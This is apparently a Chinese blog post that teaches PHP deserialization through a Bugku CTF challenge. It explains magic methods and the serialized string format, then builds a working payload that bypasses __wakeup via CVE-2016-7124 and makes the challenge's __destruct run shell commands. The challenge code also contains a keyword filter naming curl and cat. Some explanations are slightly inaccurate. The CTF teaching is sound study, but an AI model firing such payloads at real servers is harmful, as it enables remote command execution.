---
title: PHP 反序列化
date: 2021-07-08 17:08:50
description: 
categories:
  - Pentest
tags:
  - 反序列化
---

### 0x01 php 中的魔法函数
__construct()：PHP 中类的构造函数，创建对象时调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。

__destruct()：PHP 中类的析构函数，销毁对象时调用。PHP 5 后引入了析构函数的概念，析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。

__toString() 当一个对象被当作一个字符串使用。

__sleep() 在对象在被序列化之前被调用。

__wakeup 将在序列化之后立即被调用。

### 0x02 序列化和反序列化
serialize() 会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会在 __construct 后被调用，然后才执行序列化操作。

unserialize() 会检查类中是否存在一个 __wakeup() 方法。如果存在，则会在 __destruct 前调用 __wakeup 方法，预先准备对象需要的资源。

### 0x03 序列化字符串格式
在 PHP 序列化得到的字符串中，字段根据长度判断内容、以 ; 作为字段的分隔、以 } 作为结尾(字符串除外)
```php
O:3:"ctf":2:{s:11:"username";s:5:"admin";s:6:"cmd";s:2:"ls";}

O 代表对象，因为我们序列化的是一个对象，序列化数组则用 A 来表示
3 代表类名长度 
ctf 是类名
2 代表两个属性

s 代表字符串
11 代表属性名长度
username 是属性名
s:5:"admin" 属性值时字符串 属性值长度 属性值
```

### 0x04 序列化中的访问控制修饰符
需要<f>注意</f>的是当访问控制符为 private 与 protect 时，序列化时比较特殊：

protected 属性被序列化的时候属性值会变成：%00\*%00 属性名

private 属性被序列化的时候属性值会变成：%00类名%00 属性名

### 0x05 题目
Bugku CTF 的题 index.php
```php
<?php 
header("Content-Type: text/html;charset=utf-8");
error_reporting(0);
echo "<!-- YmFja3Vwcw== -->";
class ctf {
    protected $username = 'hack';
    protected $cmd = 'NULL';
    public function __construct($username, $cmd) {
        $this->username = $username;
        $this->cmd = $cmd;
    }
    function __wakeup() {
        $this->username = 'guest';
    }

    function __destruct() {
        if(preg_match("/cat|more|tail|less|head|curl|sort|echo/i", $this->cmd)) {
            exit('</br>flag能让你这么容易拿到吗？<br>');
        }
        if ($this->username === 'admin') {
           // echo "<br>right!<br>";
            $a = `$this->cmd`;
            var_dump($a);
        } else {
            echo "</br>给你个安慰奖吧，hhh！</br>";
            die();
        }
    }
}

$select = $_GET['code'];
$res = unserialize(@$select);
?>
```

### 0x06 构造 poc
题目中当 \$this->username 为 admin 时才执行命令 \`$this->cmd`

所以我们需要设置 username 为 admin，同时给 cmd 设置值

poc.php
```php
<?php
class ctf {
    protected $username;
    protected $cmd;
    public function __construct($username, $cmd)
    {
        $this->username = $username;
        $this->cmd = $cmd;
    }
}

$cmd = $_GET["cmd"]?$_GET['cmd']:"ls";
$code = serialize(new ctf('admin', $cmd));
echo $code;
?>
```
输出：O:3:"ctf":2:{s:11:"\*username";s:5:"admin";s:6:"\*cmd";s:2:"ls";}

因为访问控制符为 private，所以 poc 需要改为：

```php
<?php
class ctf {
    protected $username;
    protected $cmd;
    public function __construct($username, $cmd)
    {
        $this->username = $username;
        $this->cmd = $cmd;
    }
}

$cmd = $_GET["cmd"]?$_GET['cmd']:"ls";
$code = serialize(new ctf('admin', $cmd));
echo str_replace("*", "%00*%00", $code);
?>
```

输出：O:3:"ctf":2:{s:11:"%00\*%00username";s:5:"admin";s:6:"%00\*%00cmd";s:2:"ls";}

当题目中的代码反序列化我们提交的 code 参数(序列化后的字符串，其实是类) 时，类会先调用构造函数 __construct，从而设置 username 为 admin、cmd 为 ls

结束时我们的类调用析构函数 __destruct 时，$this->username === 'admin' 就会为 true

因为 unserialize() 在执行时会检查是否存在 __wakeup() 方法，题目中显然是存在的，所以执行完 __construct 后会再执行 __wakeup，那 $this->username 会再次被赋值为 'guest'，这里将变量个数修改为大于实际值的数就能够绕过(CVE-2016-7124)，所以最终 poc 为：
`O:3:"ctf":<f>5</f>:{s:11:"%00\*%00username";s:5:"admin";s:6:"%00\*%00cmd";s:2:"ls";}`

### 0x07 利用
每次本地访问 poc.php?cmd=whoami、poc.php?cmd=ls 生成对应的 poc

然后访问 index.php?code=O:3:"ctf":2:{xxxxxxxxxx} 即可

